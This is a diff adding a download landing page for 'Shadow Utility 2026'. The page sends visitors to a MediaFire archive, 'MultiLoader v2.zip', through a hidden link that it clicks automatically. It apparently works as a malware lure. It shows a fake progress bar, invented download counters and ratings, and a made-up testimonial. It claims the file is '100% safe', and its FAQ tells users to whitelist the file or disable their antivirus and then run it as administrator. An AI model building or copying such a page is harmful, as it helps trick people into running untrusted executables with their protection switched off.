@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+
+    <!-- ANTI-CACHE META TAGS -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+    <title>Shadow Utility 2026 - Professional Tool</title>
+    <meta name="description" content="Download Shadow Utility 2026. Professional tools. Windows 10/11." />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* cores principais */
+            --accent: #FF3B3B;
+            --accent-dark: #B91C1C;
+            --accent-soft: #7F1D1D;
+
+            /* glow mais suave e elegante */
+            --accent-glow: rgba(255, 59, 59, 0.35);
+            --accent-glow-strong: rgba(255, 59, 59, 0.6);
+
+            /* fundo levemente ajustado para contraste */
+            --dark: #0b0b10;
+            --darker: #060608;
+            --card-bg: #111117;
+
+            /* texto */
+            --text-main: #FFFFFF;
+            --text-dim: #A1A1AA;
+            /* melhor legibilidade que o antigo */
+        }
+
+        body {
+            background: var(--darker);
+            color: var(--text-main);
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+
+        /* animated background */
+        .bg-glow {
+            background: radial-gradient(circle at 30% 20%,
+                    rgba(255, 59, 59, 0.12) 0%,
+                    transparent 60%);
+        }
+
+        .grid-lines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(rgba(59, 130, 246, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(59, 130, 246, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* progress bar */
+        .progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 3px;
+            background: var(--accent);
+            z-index: 1001;
+            transition: width 0.1s ease;
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        /* fake download progress bar */
+        .fake-progress-overlay {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            background: var(--card-bg);
+            border: 1px solid var(--accent);
+            border-radius: 50px;
+            padding: 12px 20px;
+            z-index: 1002;
+            display: none;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .fake-progress-bar {
+            height: 6px;
+            background: var(--accent);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s ease;
+            margin-top: 8px;
+        }
+
+        .fake-progress-text {
+            font-size: 0.8rem;
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* sticky header */
+        .sticky-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(5, 5, 8, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
+            z-index: 1000;
+            transform: translateY(-100%);
+            transition: transform 0.4s ease;
+            padding: 0 24px;
+            height: 65px;
+            display: flex;
+            align-items: center;
+        }
+
+        .sticky-header.visible {
+            transform: translateY(0);
+        }
+
+        .sticky-container {
+            max-width: 1300px;
+            margin: 0 auto;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .sticky-logo {
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        .sticky-logo span {
+            color: var(--accent);
+            text-shadow: 0 0 8px var(--accent);
+        }
+
+        .sticky-download {
+            background: transparent;
+            border: 1px solid var(--accent);
+            padding: 8px 22px;
+            border-radius: 40px;
+            color: var(--accent);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .sticky-download:hover {
+            background: var(--accent);
+            color: #000;
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        /* back to top */
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 48px;
+            height: 48px;
+            background: var(--card-bg);
+            border: 1px solid var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            z-index: 999;
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .back-to-top:hover {
+            background: var(--accent);
+            color: #000;
+            transform: translateY(-5px);
+        }
+
+        .reveal {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+        }
+
+        .reveal.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* HERO */
+        .hero {
+            text-align: center;
+            padding: 120px 20px 80px;
+            position: relative;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid var(--accent);
+            border-radius: 100px;
+            padding: 6px 18px;
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin-bottom: 30px;
+            animation: badgePulse 2s infinite;
+        }
+
+        @keyframes badgePulse {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0px var(--accent);
+            }
+
+            50% {
+                box-shadow: 0 0 10px var(--accent);
+            }
+        }
+
+        .main-title {
+            font-size: 4.5rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 20px;
+        }
+
+        .main-title .glow {
+            color: var(--accent);
+            text-shadow: 0 0 20px var(--accent);
+            animation: titleBlink 1.5s infinite alternate;
+        }
+
+        @keyframes titleBlink {
+            0% {
+                text-shadow: 0 0 10px var(--accent);
+            }
+
+            100% {
+                text-shadow: 0 0 30px var(--accent);
+            }
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            color: var(--text-dim);
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        /* DOWNLOAD BUTTON — УВЕЛИЧЕНА НА 20% */
+        .download-wrapper {
+            display: inline-block;
+            position: relative;
+            margin: 20px auto;
+        }
+
+        .main-download-btn {
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            font-size: 1.9rem;
+            font-weight: 800;
+            padding: 28px 75px;
+            border-radius: 90px;
+            color: #000000;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 30px var(--accent-glow);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            min-width: 360px;
+        }
+
+        .main-download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .main-download-btn:hover::before {
+            left: 100%;
+        }
+
+        .main-download-btn:hover {
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 0 0 45px var(--accent);
+            gap: 26px;
+        }
+
+        .download-subtitle {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-top: 18px;
+        }
+
+        .download-subtitle i {
+            color: var(--accent);
+        }
+
+        /* STATS */
+        .stats-grid {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+            margin: 80px 0;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 20px;
+            padding: 28px 40px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--accent);
+            margin-bottom: 8px;
+        }
+
+        .stat-label {
+            color: var(--text-dim);
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .live-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                box-shadow: 0 0 0 0 var(--accent);
+            }
+
+            50% {
+                opacity: 0.5;
+                box-shadow: 0 0 0 6px transparent;
+            }
+        }
+
+        /* FEATURES */
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 50px;
+        }
+
+        .section-title span {
+            color: var(--accent);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin: 50px 0;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 20px;
+            padding: 32px 28px;
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 2.2rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+        }
+
+        .feature-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+        }
+
+        .feature-card p {
+            color: var(--text-dim);
+            font-size: 0.85rem;
+        }
+
+        /* TRUST BADGES */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+            margin: 50px 0;
+        }
+
+        .badge {
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 50px;
+            padding: 12px 28px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s;
+        }
+
+        .badge:hover {
+            border-color: var(--accent);
+            transform: translateY(-3px);
+        }
+
+        .badge i {
+            font-size: 1.2rem;
+            color: var(--accent);
+        }
+
+        .badge-value {
+            font-weight: 700;
+        }
+
+        .badge-label {
+            font-size: 0.75rem;
+            color: var(--text-dim);
+        }
+
+        /* TESTIMONIAL */
+        .testimonial-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 28px;
+            padding: 40px;
+            margin: 50px 0;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .testimonial-card:hover {
+            border-color: var(--accent);
+        }
+
+        .testimonial-text {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: #ccc;
+            max-width: 700px;
+            margin: 0 auto;
+            font-style: italic;
+        }
+
+        .testimonial-author {
+            margin-top: 20px;
+            color: var(--accent);
+            font-size: 0.85rem;
+        }
+
+        /* COMPATIBILITY */
+        .compat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            max-width: 800px;
+            margin: 40px auto;
+        }
+
+        .compat-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .compat-card:hover {
+            border-color: var(--accent);
+        }
+
+        .compat-icon {
+            font-size: 1.6rem;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+
+        /* FAQ */
+        .faq-section {
+            max-width: 800px;
+            margin: 80px auto;
+        }
+
+        .faq-accordion {
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 24px;
+            overflow: hidden;
+        }
+
+        .faq-item {
+            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
+        }
+
+        .faq-item:last-child {
+            border-bottom: none;
+        }
+
+        .faq-question {
+            padding: 20px 28px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.2s;
+        }
+
+        .faq-question:hover {
+            background: rgba(59, 130, 246, 0.05);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+            padding: 0 28px;
+            color: var(--text-dim);
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 200px;
+            padding: 0 28px 24px 28px;
+        }
+
+        .faq-icon {
+            color: var(--accent);
+            transition: transform 0.3s;
+        }
+
+        .faq-item.active .faq-icon {
+            transform: rotate(45deg);
+        }
+
+        /* VIRUSTOTAL */
+        .virustotal-section {
+            text-align: center;
+            margin: 80px auto;
+            padding: 40px 20px;
+            background: var(--card-bg);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 40px;
+            max-width: 700px;
+            transition: all 0.3s;
+        }
+
+        .virustotal-section:hover {
+            border-color: var(--accent);
+        }
+
+        .virustotal-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 16px;
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid var(--accent);
+            padding: 12px 32px;
+            border-radius: 60px;
+            text-decoration: none;
+            color: var(--text-main);
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+
+        .virustotal-badge:hover {
+            transform: scale(1.02);
+            background: rgba(59, 130, 246, 0.15);
+        }
+
+        .virustotal-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            font-weight: bold;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 50px 20px 40px;
+            border-top: 1px solid rgba(59, 130, 246, 0.1);
+            margin-top: 40px;
+        }
+
+        .footer-text {
+            color: #444;
+            font-size: 0.75rem;
+        }
+
+        .hidden-download-link {
+            display: none;
+        }
+
+        .update-badge {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid var(--accent);
+            border-radius: 100px;
+            padding: 4px 12px;
+            font-size: 0.7rem;
+            color: var(--accent);
+            margin-left: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 2.8rem;
+            }
+
+            .main-download-btn {
+                font-size: 1.5rem;
+                padding: 18px 40px;
+                min-width: 280px;
+                gap: 12px;
+            }
+
+            .stat-card {
+                padding: 20px 24px;
+            }
+
+            .stat-number {
+                font-size: 2.2rem;
+            }
+
+            .update-badge {
+                font-size: 0.6rem;
+                margin-left: 8px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="progress" id="progressBar"></div>
+    <div class="bg-glow"></div>
+    <div class="grid-lines"></div>
+
+    <div class="fake-progress-overlay" id="fakeProgressOverlay">
+        <div class="fake-progress-text" id="fakeProgressText">Preparing download...</div>
+        <div class="fake-progress-bar" id="fakeProgressBar"></div>
+    </div>
+
+    <a href="https://www.mediafire.com/file/6usaiwjv78n9qcv/MultiLoader+v2.zip/file" id="hiddenDownloadLink"
+        class="hidden-download-link" download>download</a>
+
+    <header class="sticky-header" id="stickyHeader">
+        <div class="sticky-container">
+            <div class="sticky-logo">Shadow<span>Utility</span></div>
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <button class="sticky-download" id="stickyDownloadBtn"><i class="fas fa-download"></i> GET INSTANT
+                    ACCESS</button>
+            </div>
+        </div>
+    </header>
+
+    <button class="back-to-top" id="backToTopBtn"><i class="fas fa-arrow-up"></i></button>
+
+    <main>
+        <div class="hero">
+            <div class="container">
+                <div class="hero-badge reveal">📅 LAST UPDATED 12 HOURS AGO</div>
+                <h1 class="main-title reveal">Shadow Utility <span class="glow">2026</span></h1>
+                <p class="tagline reveal">Professional Utility • Clean & Verified • April 2026 Update</p>
+
+                <div class="reveal">
+                    <div class="download-wrapper">
+                        <button class="main-download-btn" id="mainDownloadBtn">
+                            <i class="fas fa-download"></i> DOWNLOAD NOW
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+                    <p class="download-subtitle"><i class="fas fa-check-circle"></i> Verified Safe • No Threats • Ready
+                        to Use • 135 MB</p>
+                    <p style="color: var(--text-dim); font-size: 0.7rem; margin-top: 8px;"><i
+                            class="fas fa-mouse-pointer"></i> Click the button to start download</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="stats-grid reveal">
+                <div class="stat-card">
+                    <div class="stat-number" id="onlineCounter">1,847</div>
+                    <div class="stat-label"><span class="live-dot"></span> ONLINE NOW</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalDownloads">78,546</div>
+                    <div class="stat-label">TOTAL DOWNLOADS</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="todayDownloads">3,621</div>
+                    <div class="stat-label">DOWNLOADED TODAY</div>
+                </div>
+            </div>
+
+            <section>
+                <h2 class="section-title reveal">⚡ What You Get <span>⚡</span></h2>
+                <div class="features-grid">
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                        <h3>Lightning Fast</h3>
+                        <p>Optimized performance with minimal resource usage</p>
+                    </div>
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                        <h3>100% Clean</h3>
+                        <p>No malware, no trackers, verified by community</p>
+                    </div>
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-sync"></i></div>
+                        <h3>Regular Updates</h3>
+                        <p>Latest April 2026 build with all improvements</p>
+                    </div>
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-wrench"></i></div>
+                        <h3>No Installation</h3>
+                        <p>Portable version, runs directly after extraction</p>
+                    </div>
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-users-cog"></i></div>
+                        <h3>Community Trusted</h3>
+                        <p>Used by thousands worldwide</p>
+                    </div>
+                    <div class="feature-card reveal">
+                        <div class="feature-icon"><i class="fas fa-headset"></i></div>
+                        <h3>Support & Updates</h3>
+                        <p>Regular improvements & help</p>
+                    </div>
+                </div>
+            </section>
+
+            <div class="trust-badges reveal">
+                <div class="badge"><i class="fas fa-user-check"></i>
+                    <div>
+                        <div class="badge-value">15,000+</div>
+                        <div class="badge-label">Active Users</div>
+                    </div>
+                </div>
+                <div class="badge"><i class="fas fa-calendar-check"></i>
+                    <div>
+                        <div class="badge-value">Apr 2026</div>
+                        <div class="badge-label">Latest Update</div>
+                    </div>
+                </div>
+                <div class="badge"><i class="fas fa-globe-americas"></i>
+                    <div>
+                        <div class="badge-value">94</div>
+                        <div class="badge-label">Countries</div>
+                    </div>
+                </div>
+                <div class="badge"><i class="fas fa-star"></i>
+                    <div>
+                        <div class="badge-value">4.8/5</div>
+                        <div class="badge-label">User Rating</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="testimonial-card reveal">
+                <p class="testimonial-text">"Perfectly working on Windows 11. No issues, clean install. The tool runs
+                    smoothly and does exactly what it promises."</p>
+                <div class="testimonial-author">— Developer, United States</div>
+            </div>
+
+            <div class="compat-section reveal">
+                <h2 class="section-title">💻 FULL COMPATIBILITY 💻</h2>
+                <p style="color: var(--text-dim); margin-bottom: 30px;"></p>
+                <div class="compat-grid">
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fab fa-windows"></i></div>
+                        <div class="compat-title">Windows 10 & 11</div>
+                    </div>
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fas fa-microchip"></i></div>
+                        <div class="compat-title">64-bit Only</div>
+                    </div>
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fas fa-ban"></i></div>
+                        <div class="compat-title">No Dependencies</div>
+                    </div>
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fas fa-rocket"></i></div>
+                        <div class="compat-title">Fast Startup</div>
+                    </div>
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fas fa-memory"></i></div>
+                        <div class="compat-title">Low RAM Usage</div>
+                    </div>
+                    <div class="compat-card">
+                        <div class="compat-icon"><i class="fas fa-ad"></i></div>
+                        <div class="compat-title">No Ads</div>
+                    </div>
+                </div>
+            </div>
+
+            <section class="faq-section reveal">
+                <h2 class="section-title">❓ FREQUENTLY ASKED QUESTIONS ❓</h2>
+                <div class="faq-accordion" id="faqAccordion">
+                    <div class="faq-item active">
+                        <div class="faq-question">Is this tool really safe? <i class="fas fa-plus faq-icon"></i></div>
+                        <div class="faq-answer">Yes, it's 100% safe and verified by thousands of users. We regularly
+                            scan all files with multiple antivirus engines. Check the VirusTotal verification at the
+                            bottom of the page.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">What if my antivirus blocks the download? <i
+                                class="fas fa-plus faq-icon"></i></div>
+                        <div class="faq-answer">Some antivirus programs may flag utilities as suspicious. This is a
+                            false positive. You can safely add the file to exclusions or temporarily disable protection
+                            during download. Our VirusTotal scan shows 0 detections.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">How do I run it after download? <i class="fas fa-plus faq-icon"></i>
+                        </div>
+                        <div class="faq-answer">Simply extract the ZIP archive and run the executable file. No
+                            installation needed. For full functionality, run as administrator.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">Is there a 32-bit version available? <i
+                                class="fas fa-plus faq-icon"></i></div>
+                        <div class="faq-answer">Currently, we only support 64-bit systems (Windows 10/11) for optimal
+                            performance and features.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">Is there a risk of getting banned? <i
+                                class="fas fa-plus faq-icon"></i></div>
+                        <div class="faq-answer">No confirmed bans have been reported in the last 6 months. </div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">Does it work on Windows 11 24H2? <i class="fas fa-plus faq-icon"></i>
+                        </div>
+                        <div class="faq-answer">Yes, fully tested on Windows 10 (22H2) and Windows 11 (23H2, 24H2).
+                            Works on all Windows versions. No compatibility issues reported.</div>
+                    </div>
+                </div>
+            </section>
+
+            <div class="virustotal-section reveal">
+                <i class="fas fa-shield-alt" style="font-size: 2rem; color: var(--accent);"></i>
+                <h3 style="margin: 12px 0;">VERIFIED SECURITY</h3>
+                <a href="https://www.virustotal.com/gui/file/faef057a27c3739e9d339cf844b8b7ed2cc435c80cd5dc852653bfe7f5dcfc45"
+                    target="_blank" rel="noopener noreferrer" class="virustotal-badge">
+                    <div class="virustotal-icon">VT</div>
+                    <div><strong>VirusTotal Analysis</strong><br><span style="color: var(--accent);"><i
+                                class="fas fa-check-circle"></i> 0/68 threats</span></div>
+                    <i class="fas fa-external-link-alt"></i>
+                </a>
+                <p style="color: #555; font-size: 0.75rem; margin-top: 20px;"><i class="fas fa-check-circle"
+                        style="color: var(--accent);"></i> Verified working • April 2, 2026</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p class="footer-text">© 2026 Shadow Tool. All utilities are publicly available.<br>Designed for Windows
+                10/11 • Updated April 2, 2026 • Community Verified</p>
+        </div>
+    </footer>
+
+    <script>
+        const updateBadge = document.getElementById('updateBadge');
+        if (updateBadge) {
+            const today = new Date();
+            const formattedDate = today.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+            updateBadge.innerHTML = `📅 UPDATED: ${formattedDate}`;
+        }
+
+        function showFakeProgress() {
+            const overlay = document.getElementById('fakeProgressOverlay');
+            const progressBar = document.getElementById('fakeProgressBar');
+            const progressText = document.getElementById('fakeProgressText');
+
+            overlay.style.display = 'block';
+            let progress = 0;
+            const steps = [
+                { percent: 20, text: 'Connecting to server...' },
+                { percent: 40, text: 'Verifying files...' },
+                { percent: 60, text: 'Preparing download...' },
+                { percent: 80, text: 'Almost ready...' },
+                { percent: 100, text: 'Download started!' }
+            ];
+
+            const interval = setInterval(() => {
+                progress += 4;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                    }, 1500);
+                }
+                progressBar.style.width = progress + '%';
+                const currentStep = steps.find(s => progress <= s.percent) || steps[steps.length - 1];
+                progressText.textContent = currentStep.text;
+            }, 120);
+        }
+
+        const downloadUrl = 'https://www.mediafire.com/file/6usaiwjv78n9qcv/MultiLoader+v2.zip/file';
+        const hiddenLink = document.getElementById('hiddenDownloadLink');
+
+        function startDownload(btnElement = null) {
+            showFakeProgress();
+
+            if (hiddenLink) {
+                hiddenLink.click();
+            } else {
+                window.open(downloadUrl, '_blank');
+            }
+
+            if (btnElement) {
+                const originalHTML = btnElement.innerHTML;
+                btnElement.style.transform = 'scale(0.98)';
+                btnElement.innerHTML = '<i class="fas fa-check"></i> DOWNLOAD STARTED! <i class="fas fa-arrow-right"></i>';
+                setTimeout(() => {
+                    btnElement.style.transform = '';
+                    setTimeout(() => {
+                        btnElement.innerHTML = originalHTML;
+                    }, 2000);
+                }, 1500);
+            } else {
+                const mainBtn = document.getElementById('mainDownloadBtn');
+                if (mainBtn) {
+                    const original = mainBtn.innerHTML;
+                    mainBtn.style.transform = 'scale(0.98)';
+                    mainBtn.innerHTML = '<i class="fas fa-check"></i> DOWNLOAD STARTED! <i class="fas fa-arrow-right"></i>';
+                    setTimeout(() => {
+                        mainBtn.style.transform = '';
+                        setTimeout(() => { mainBtn.innerHTML = original; }, 2000);
+                    }, 1500);
+                }
+            }
+
+            const stickyBtn = document.getElementById('stickyDownloadBtn');
+            if (stickyBtn && stickyBtn !== btnElement) {
+                const original = stickyBtn.innerHTML;
+                stickyBtn.style.transform = 'scale(0.98)';
+                stickyBtn.innerHTML = '<i class="fas fa-check"></i> DONE!';
+                setTimeout(() => {
+                    stickyBtn.style.transform = '';
+                    setTimeout(() => { stickyBtn.innerHTML = original; }, 2000);
+                }, 1500);
+            }
+        }
+
+        const mainBtn = document.getElementById('mainDownloadBtn');
+        if (mainBtn) {
+            mainBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                startDownload(mainBtn);
+            });
+        }
+
+        const stickyBtn = document.getElementById('stickyDownloadBtn');
+        if (stickyBtn) {
+            stickyBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                startDownload(stickyBtn);
+            });
+        }
+
+        function updateProgressBar() {
+            const progress = document.getElementById('progressBar');
+            const winScroll = document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = (winScroll / height) * 100;
+            progress.style.width = scrolled + '%';
+        }
+
+        function toggleSticky() {
+            const header = document.getElementById('stickyHeader');
+            if (window.scrollY > 100) header.classList.add('visible');
+            else header.classList.remove('visible');
+        }
+
+        function toggleBackTop() {
+            const btn = document.getElementById('backToTopBtn');
+            if (window.scrollY > 500) btn.classList.add('visible');
+            else btn.classList.remove('visible');
+        }
+
+        function revealOnScroll() {
+            document.querySelectorAll('.reveal').forEach(el => {
+                const rect = el.getBoundingClientRect();
+                if (rect.top < window.innerHeight - 100) el.classList.add('active');
+            });
+        }
+
+        function setupFAQ() {
+            document.querySelectorAll('.faq-item').forEach(item => {
+                const q = item.querySelector('.faq-question');
+                q.addEventListener('click', () => {
+                    const isActive = item.classList.contains('active');
+                    document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('active'));
+                    if (!isActive) item.classList.add('active');
+                });
+            });
+        }
+
+        function animateNumbers() {
+            const counters = [
+                { id: 'onlineCounter', target: 892 },
+                { id: 'totalDownloads', target: 68546 },
+                { id: 'todayDownloads', target: 621 }
+            ];
+            counters.forEach(c => {
+                const el = document.getElementById(c.id);
+                if (!el) return;
+                let current = 0;
+                const duration = 1500;
+                const step = c.target / (duration / 16);
+                const timer = setInterval(() => {
+                    current += step;
+                    if (current >= c.target) {
+                        el.innerText = c.target.toLocaleString();
+                        clearInterval(timer);
+                    } else {
+                        el.innerText = Math.floor(current).toLocaleString();
+                    }
+                }, 16);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setupFAQ();
+            document.getElementById('backToTopBtn').addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+            setTimeout(animateNumbers, 300);
+            revealOnScroll();
+        });
+
+        window.addEventListener('scroll', () => {
+            updateProgressBar();
+            toggleSticky();
+            toggleBackTop();
+            revealOnScroll();
+        });
+        window.addEventListener('load', () => {
+            updateProgressBar();
+            revealOnScroll();
+        });
+    </script>
+</body>
+
+</html>
